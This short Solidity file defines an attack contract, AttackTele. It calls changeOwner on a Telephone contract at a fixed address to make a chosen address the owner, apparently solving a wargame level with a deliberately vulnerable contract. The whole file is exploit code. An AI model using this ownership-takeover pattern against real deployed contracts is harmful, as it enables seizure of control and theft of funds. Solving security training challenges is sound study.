pragma solidity ^0.6.0;

import "./default.sol";

contract AttackTele {
    Telephone tele = Telephone(0x4e4caFEe1ff94fD059369a1a5C677Dd65a757825);

    function gainControl(address me) public {
        tele.changeOwner(me);
    }
}
